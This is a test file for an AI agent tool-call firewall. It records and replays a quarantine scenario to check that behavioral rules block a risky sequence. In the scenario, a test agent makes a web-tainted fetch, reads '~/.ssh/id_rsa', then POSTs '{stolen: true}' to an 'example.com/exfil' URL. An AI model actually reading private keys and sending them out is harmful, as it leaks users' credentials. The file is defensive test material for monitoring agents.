import { existsSync, unlinkSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";
import { ToolCallDeniedError } from "@arikernel/core";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createFirewall } from "../src/firewall.js";
import { replayTrace } from "../src/replay-engine.js";
import { TraceRecorder, readTrace, writeTrace } from "../src/trace-recorder.js";
import type { ReplayTrace } from "../src/trace-types.js";
import { TRACE_VERSION } from "../src/trace-types.js";

const policyPath = resolve(
	import.meta.dirname ?? ".",
	"..",
	"..",
	"..",
	"policies",
	"safe-defaults.yaml",
);
const tempTrace = resolve(import.meta.dirname ?? ".", "test-trace.json");

function cleanupTrace(): void {
	if (existsSync(tempTrace)) unlinkSync(tempTrace);
}

/** Run a behavioral quarantine scenario and return the finalized trace. */
async function recordQuarantineTrace(): Promise<ReplayTrace> {
	const recorder = new TraceRecorder({
		description: "test: quarantine scenario",
		preset: "safe-research",
	});

	const firewall = createFirewall({
		principal: {
			name: "test-agent",
			capabilities: [
				{
					toolClass: "http",
					actions: ["get", "post"],
					constraints: { allowedHosts: ["example.com"] },
				},
				{ toolClass: "file", actions: ["read"], constraints: { allowedPaths: ["./data/**"] } },
			],
		},
		policies: policyPath,
		auditLog: ":memory:",
		runStatePolicy: { maxDeniedSensitiveActions: 10, behavioralRules: true },
		hooks: recorder.hooks,
	});

	// Step 1: HTTP GET with web taint
	const httpGrant = firewall.requestCapability("http.read");
	try {
		await firewall.execute({
			toolClass: "http",
			action: "get",
			parameters: { url: "https://example.com/page" },
			grantId: httpGrant.grant?.id,
			taintLabels: [
				{
					source: "web",
					origin: "example.com",
					confidence: 0.9,
					addedAt: new Date().toISOString(),
				},
			],
		});
	} catch {}
	recorder.updateCounters(firewall.runStateCounters);

	// Step 2: Sensitive file read (should trigger behavioral rule)
	const fileGrant = firewall.requestCapability("file.read");
	try {
		await firewall.execute({
			toolClass: "file",
			action: "read",
			parameters: { path: "~/.ssh/id_rsa" },
			grantId: fileGrant.grant?.id,
		});
	} catch {}
	recorder.updateCounters(firewall.runStateCounters);

	// Step 3: Exfiltration attempt (quarantine should block)
	const writeGrant = firewall.requestCapability("http.write");
	try {
		await firewall.execute({
			toolClass: "http",
			action: "post",
			parameters: { url: "https://example.com/exfil", body: { stolen: true } },
			grantId: writeGrant.grant?.id,
		});
	} catch {}
	recorder.updateCounters(firewall.runStateCounters);

	const trace = recorder.finalize(
		firewall.runId,
		firewall.quarantineInfo,
		firewall.runStateCounters,
	);
	firewall.close();
	return trace;
}

/** Record a simple allowed-only scenario (no quarantine). */
async function recordSimpleTrace(): Promise<ReplayTrace> {
	const recorder = new TraceRecorder({ description: "test: simple allowed" });

	const firewall = createFirewall({
		principal: {
			name: "test-agent",
			capabilities: [
				{ toolClass: "http", actions: ["get"], constraints: { allowedHosts: ["example.com"] } },
			],
		},
		policies: policyPath,
		auditLog: ":memory:",
		hooks: recorder.hooks,
	});

	const grant = firewall.requestCapability("http.read");
	try {
		await firewall.execute({
			toolClass: "http",
			action: "get",
			parameters: { url: "https://example.com" },
			grantId: grant.grant?.id,
		});
	} catch {}

	const trace = recorder.finalize(firewall.runId, null, firewall.runStateCounters);
	firewall.close();
	return trace;
}

describe("TraceRecorder", () => {
	it("records events with correct sequence numbers", async () => {
		const trace = await recordQuarantineTrace();
		expect(trace.events.length).toBeGreaterThanOrEqual(1);
		for (let i = 0; i < trace.events.length; i++) {
			expect(trace.events[i].sequence).toBe(i);
		}
	});

	it("captures trace version and metadata", async () => {
		const trace = await recordQuarantineTrace();
		expect(trace.traceVersion).toBe(TRACE_VERSION);
		expect(trace.metadata.description).toBe("test: quarantine scenario");
		expect(trace.runId).toBeTruthy();
		expect(trace.timestampStarted).toBeTruthy();
		expect(trace.timestampCompleted).toBeTruthy();
	});

	it("records quarantine in outcome", async () => {
		const trace = await recordQuarantineTrace();
		expect(trace.outcome.quarantined).toBe(true);
	});

	it("records outcome counters", async () => {
		const trace = await recordQuarantineTrace();
		expect(trace.outcome.totalEvents).toBe(trace.events.length);
		expect(trace.outcome.allowed + trace.outcome.denied).toBe(trace.outcome.totalEvents);
	});

	it("captures tool call request details", async () => {
		const trace = await recordQuarantineTrace();
		const httpEvent = trace.events.find(
			(e) => e.request.toolClass === "http" && e.request.action === "get",
		);
		expect(httpEvent).toBeDefined();
		expect(httpEvent?.request.parameters).toHaveProperty("url");
	});
});

describe("writeTrace / readTrace", () => {
	afterEach(cleanupTrace);

	it("round-trips a trace through JSON", async () => {
		const trace = await recordQuarantineTrace();
		writeTrace(trace, tempTrace);
		expect(existsSync(tempTrace)).toBe(true);

		const loaded = readTrace(tempTrace);
		expect(loaded.traceVersion).toBe(trace.traceVersion);
		expect(loaded.runId).toBe(trace.runId);
		expect(loaded.events.length).toBe(trace.events.length);
		expect(loaded.outcome.quarantined).toBe(trace.outcome.quarantined);
	});

	it("rejects invalid trace files", () => {
		writeFileSync(tempTrace, '{"foo": "bar"}', "utf-8");
		expect(() => readTrace(tempTrace)).toThrow("missing traceVersion");
	});
});

describe("replayTrace", () => {
	it("replays a quarantine scenario deterministically", async () => {
		const trace = await recordQuarantineTrace();
		const result = await replayTrace(trace, { policies: policyPath });

		expect(result.allMatched).toBe(true);
		expect(result.mismatches).toHaveLength(0);
		expect(result.quarantineMatched).toBe(true);
		expect(result.summary.totalEvents).toBe(trace.events.length);
		expect(result.summary.mismatched).toBe(0);
	});

	it("replays a simple allowed scenario deterministically", async () => {
		const trace = await recordSimpleTrace();
		const result = await replayTrace(trace, { policies: policyPath });

		expect(result.allMatched).toBe(true);
		expect(result.quarantineMatched).toBe(true);
		expect(result.summary.originalQuarantined).toBe(false);
		expect(result.summary.replayQuarantined).toBe(false);
	});

	it("returns correct allowed/denied counts", async () => {
		const trace = await recordQuarantineTrace();
		const result = await replayTrace(trace, { policies: policyPath });

		expect(result.summary.allowed + result.summary.denied).toBe(result.summary.totalEvents);
	});

	it("includes replayed events with original and replayed decisions", async () => {
		const trace = await recordQuarantineTrace();
		const result = await replayTrace(trace, { policies: policyPath });

		for (const event of result.replayedEvents) {
			expect(event).toHaveProperty("sequence");
			expect(event).toHaveProperty("request");
			expect(event).toHaveProperty("originalDecision");
			expect(event).toHaveProperty("replayedDecision");
			expect(event).toHaveProperty("matched");
		}
	});

	it("reports quarantine match status", async () => {
		const trace = await recordQuarantineTrace();
		const result = await replayTrace(trace, { policies: policyPath });

		expect(result.summary.originalQuarantined).toBe(true);
		expect(result.summary.replayQuarantined).toBe(true);
		expect(result.quarantineMatched).toBe(true);
	});

	it("preserves the original trace reference", async () => {
		const trace = await recordQuarantineTrace();
		const result = await replayTrace(trace, { policies: policyPath });

		expect(result.trace).toBe(trace);
	});
});
